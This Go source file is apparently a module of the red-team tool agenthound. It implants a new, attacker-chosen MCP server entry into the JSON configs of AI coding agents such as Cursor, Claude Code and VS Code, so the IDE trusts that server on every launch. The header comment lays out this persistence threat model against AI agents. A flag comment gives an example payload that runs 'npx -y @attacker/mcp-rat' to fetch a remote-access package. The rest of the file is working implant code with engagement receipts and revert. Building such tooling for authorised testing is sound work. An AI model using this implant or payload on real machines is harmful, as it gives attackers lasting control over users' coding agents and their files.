// Package mcpconfigimplant implements the v0.4 MCP-config Implanter.
//
// Threat model. AI-coding-agent clients (Cursor, Claude Code, VS Code,
// Continue, …) read a JSON MCP config to learn which MCP servers to
// trust. An attacker who can append a server entry to that config
// makes the user's IDE auto-trust the attacker's MCP server on the
// next launch. The MCP server then gets called by the agent during
// normal use — full read/write access to whatever the agent does.
//
// Why an Implanter and not a Poisoner. The line is: Poisoner modifies
// content the agent CONSUMES; Implanter installs PERSISTENCE. Adding a
// new MCP server to the client's config is a textbook persistence
// pattern — the client trusts the entry on every future launch
// without operator action. This is why we ship it under
// `agenthound implant`, distinct from `agenthound poison`.
//
// Sentinel-bracketed insertion via JSON-comment block. JSON does not
// have comments, so we cannot use the same `<!--` sentinel as
// instruction-files. Instead we prefix the implanted server's name
// with a known marker (default "agenthound-implant-<engagement-id>")
// and the receipt records the full key so revert can JSON-decode,
// strip the keyed entry, and re-encode. Idempotency: revert is a
// no-op if the keyed entry is already gone.
package mcpconfigimplant

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/spf13/pflag"

	"github.com/adithyan-ak/agenthound/sdk/action"
	"github.com/adithyan-ak/agenthound/sdk/module"
)

// MaxFileBytes caps the read-and-rewrite size. MCP configs are tiny
// (~kilobytes); cap at 1 MiB defensively.
const MaxFileBytes int64 = 1 << 20

// Implanter is the registered module.
type Implanter struct {
	stateful module.StatefulModule
}

func New() *Implanter {
	return &Implanter{stateful: module.NewFileStatefulModule("mcp.config.implant")}
}

func (i *Implanter) Stateful() module.StatefulModule { return i.stateful }
func (i *Implanter) SetStateful(s module.StatefulModule) {
	i.stateful = s
}

// RegisterFlags satisfies module.FlagsModule. The implant CLI provides
// --target-id (the absolute config path) and --inject (a JSON block
// describing the malicious server, e.g.
// {"command":"npx","args":["-y","@attacker/mcp-rat"]}).
//
// --servers-key gives operators an escape hatch when the target client
// uses a non-standard top-level key (VS Code uses `servers`, Zed uses
// `context_servers`, Windsurf uses `mcpServers` with `serverUrl`
// child shape). Default is `mcpServers` (Claude Desktop, Cursor,
// Claude Code, Cline).
func (i *Implanter) RegisterFlags(fs *pflag.FlagSet) {
	fs.String("file", "", "Absolute path to the MCP config JSON (.cursor/mcp.json, etc.). Required.")
	fs.String("server-name", "", "Name to use for the implanted server entry. Defaults to agenthound-implant-<engagement-id>.")
	fs.String("servers-key", "mcpServers",
		"Top-level key in the JSON that holds the server map. Override for VS Code (servers), Zed (context_servers).")
}

// Implant decodes the MCP config JSON, inserts a server entry under
// the configured name, and atomically writes the file back.
func (i *Implanter) Implant(ctx context.Context, t action.Target, payload action.ImplantPayload) (*action.ImplantReceipt, error) {
	path, _ := payload.Extras["file"].(string)
	path = strings.TrimSpace(path)
	if path == "" {
		path = strings.TrimSpace(payload.TargetID)
	}
	if path == "" {
		return nil, errors.New("mcp config implant: --file <abs-path> is required")
	}
	if !filepath.IsAbs(path) {
		return nil, fmt.Errorf("mcp config implant: --file %q must be an absolute path", path)
	}
	if payload.InjectionContent == "" {
		return nil, errors.New("mcp config implant: --inject (JSON object describing server) is required")
	}
	engagementID := payload.EngagementID
	if engagementID == "" {
		return nil, errors.New("mcp config implant: --engagement-id is required")
	}
	serversKey, _ := payload.Extras["servers-key"].(string)
	if serversKey == "" {
		serversKey = "mcpServers"
	}
	serverName, _ := payload.Extras["server-name"].(string)
	if serverName == "" {
		serverName = "agenthound-implant-" + engagementID
	}

	var serverEntry map[string]any
	if err := json.Unmarshal([]byte(payload.InjectionContent), &serverEntry); err != nil {
		return nil, fmt.Errorf("mcp config implant: --inject must be a JSON object: %w", err)
	}

	original, preHash, existed, origMode, err := readFileBounded(path)
	if err != nil {
		return nil, fmt.Errorf("read target file: %w", err)
	}
	writeMode := origMode
	if !existed {
		writeMode = 0o600
	}

	configMap := map[string]any{}
	if len(original) > 0 {
		if err := json.Unmarshal([]byte(original), &configMap); err != nil {
			return nil, fmt.Errorf("decode existing JSON config: %w", err)
		}
	}

	serversRaw, ok := configMap[serversKey]
	if !ok || serversRaw == nil {
		configMap[serversKey] = map[string]any{}
		serversRaw = configMap[serversKey]
	}
	servers, ok := serversRaw.(map[string]any)
	if !ok {
		return nil, fmt.Errorf("config %q at key %q is not an object (got %T) — refusing to clobber", path, serversKey, serversRaw)
	}
	if _, exists := servers[serverName]; exists {
		return nil, fmt.Errorf("mcp config implant: server %q already exists under %q in %s; choose a different --server-name", serverName, serversKey, path)
	}
	servers[serverName] = serverEntry
	configMap[serversKey] = servers

	final, err := json.MarshalIndent(configMap, "", "  ")
	if err != nil {
		return nil, fmt.Errorf("encode implanted JSON: %w", err)
	}
	final = append(final, '\n')
	postHash := sha256Hex(final)

	receipt := &action.ImplantReceipt{
		ModuleID:         "mcp.config.implant",
		EngagementID:     engagementID,
		Target:           t,
		TargetID:         path,
		InjectionContent: payload.InjectionContent,
		PreSHA256:        preHash,
		PostSHA256:       postHash,
		AppliedAt:        time.Now().UTC(),
		DryRun:           payload.DryRun,
		Extra: map[string]any{
			"file":         path,
			"servers_key":  serversKey,
			"server_name":  serverName,
			"file_existed": existed,
			"orig_mode":    modeStr(writeMode),
		},
	}

	if payload.DryRun {
		slog.Info("mcp config implant dry-run",
			"file", path,
			"engagement_id", engagementID,
			"server_name", serverName)
		return receipt, nil
	}

	if _, err := i.stateful.WriteReceipt(engagementID, receipt); err != nil {
		return nil, fmt.Errorf("persist receipt before mutation: %w", err)
	}

	if err := writeFileAtomic(path, final, writeMode); err != nil {
		return nil, fmt.Errorf("write implanted file: %w", err)
	}
	slog.Info("mcp config implant applied",
		"file", path,
		"engagement_id", engagementID,
		"server_name", serverName,
		"servers_key", serversKey)
	return receipt, nil
}

// Revert decodes the config, drops the implanted server entry, and
// writes the file back. Idempotent: if the entry is already absent,
// Revert is a no-op.
func (i *Implanter) Revert(ctx context.Context, receipt action.Receipt) error {
	r, ok := normalizeReceipt(receipt)
	if !ok {
		return fmt.Errorf("mcp config implant revert: unexpected receipt type %T", receipt)
	}
	if r.DryRun {
		return nil
	}
	path, _ := r.Extra["file"].(string)
	serversKey, _ := r.Extra["servers_key"].(string)
	serverName, _ := r.Extra["server_name"].(string)
	if path == "" || serversKey == "" || serverName == "" {
		return errors.New("mcp config implant revert: receipt missing path / servers_key / server_name")
	}
	// file_existed defaults to true for receipts written before this
	// field existed, matching the prior behavior of always leaving the
	// file behind.
	fileExisted := true
	if v, ok := r.Extra["file_existed"].(bool); ok {
		fileExisted = v
	}
	origMode := parseMode(r.Extra["orig_mode"], 0o600)

	current, _, _, _, err := readFileBounded(path)
	if err != nil {
		return fmt.Errorf("read target file: %w", err)
	}
	if current == "" {
		// File no longer exists. Nothing to revert.
		return nil
	}
	configMap := map[string]any{}
	if err := json.Unmarshal([]byte(current), &configMap); err != nil {
		return fmt.Errorf("decode current JSON: %w", err)
	}
	serversRaw, ok := configMap[serversKey]
	if !ok {
		return nil
	}
	servers, ok := serversRaw.(map[string]any)
	if !ok {
		return nil
	}
	if _, exists := servers[serverName]; !exists {
		// Already reverted out-of-band.
		return nil
	}
	delete(servers, serverName)
	configMap[serversKey] = servers

	// If implant created this file and dropping our entry leaves nothing
	// but the empty servers map we added, remove the file to restore the
	// original absent state. Any other server or top-level key means the
	// client (or operator) added content we must not destroy.
	if !fileExisted && len(servers) == 0 && len(configMap) == 1 {
		if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
			return fmt.Errorf("remove implant-created file: %w", err)
		}
		slog.Info("mcp config implant reverted (removed implant-created file)",
			"file", path,
			"engagement_id", r.EngagementID,
			"server_name", serverName)
		return nil
	}

	final, err := json.MarshalIndent(configMap, "", "  ")
	if err != nil {
		return fmt.Errorf("encode reverted JSON: %w", err)
	}
	final = append(final, '\n')
	if err := writeFileAtomic(path, final, origMode); err != nil {
		return fmt.Errorf("write reverted file: %w", err)
	}
	slog.Info("mcp config implant reverted",
		"file", path,
		"engagement_id", r.EngagementID,
		"server_name", serverName)
	return nil
}

// readFileBounded returns the file content, its SHA-256 hex, whether the
// file existed, its permission bits, and any error. A missing file is
// not an error (existed=false) — implant creates the config when absent.
func readFileBounded(path string) (content string, hash string, existed bool, mode os.FileMode, err error) {
	f, err := os.Open(path)
	if err != nil {
		if os.IsNotExist(err) {
			return "", "", false, 0, nil
		}
		return "", "", false, 0, err
	}
	defer func() { _ = f.Close() }()
	st, err := f.Stat()
	if err != nil {
		return "", "", false, 0, err
	}
	if st.Size() > MaxFileBytes {
		return "", "", false, 0, fmt.Errorf("file %q too large (%d bytes; cap %d)", path, st.Size(), MaxFileBytes)
	}
	data := make([]byte, st.Size())
	if _, err := f.Read(data); err != nil && err.Error() != "EOF" {
		return "", "", false, 0, err
	}
	return string(data), sha256Hex(data), true, st.Mode().Perm(), nil
}

// writeFileAtomic writes data via temp+rename, applying mode exactly
// (chmod after write to bypass umask). Callers pass the original file's
// mode so revert restores prior permissions; newly-created configs get
// 0o600.
func writeFileAtomic(path string, data []byte, mode os.FileMode) error {
	dir := filepath.Dir(path)
	if dir != "" {
		_ = os.MkdirAll(dir, 0o700)
	}
	tmp := path + ".tmp.agenthound"
	if err := os.WriteFile(tmp, data, mode); err != nil {
		return err
	}
	if err := os.Chmod(tmp, mode); err != nil {
		_ = os.Remove(tmp)
		return err
	}
	if err := os.Rename(tmp, path); err != nil {
		_ = os.Remove(tmp)
		return err
	}
	return nil
}

// modeStr/parseMode round-trip a file mode through the receipt's JSON
// Extra map as an octal string, avoiding the float64 coercion JSON
// applies to numbers when a receipt is reloaded for revert.
func modeStr(m os.FileMode) string {
	return fmt.Sprintf("%o", m.Perm())
}

func parseMode(v any, fallback os.FileMode) os.FileMode {
	switch s := v.(type) {
	case string:
		if n, err := strconv.ParseUint(s, 8, 32); err == nil {
			return os.FileMode(n).Perm()
		}
	case float64:
		return os.FileMode(uint32(s)).Perm()
	}
	return fallback
}

func sha256Hex(b []byte) string {
	h := sha256.Sum256(b)
	return hex.EncodeToString(h[:])
}

func normalizeReceipt(r action.Receipt) (*action.ImplantReceipt, bool) {
	switch v := r.(type) {
	case *action.ImplantReceipt:
		return v, true
	case action.ImplantReceipt:
		return &v, true
	}
	return nil, false
}

var _ action.Implanter = (*Implanter)(nil)
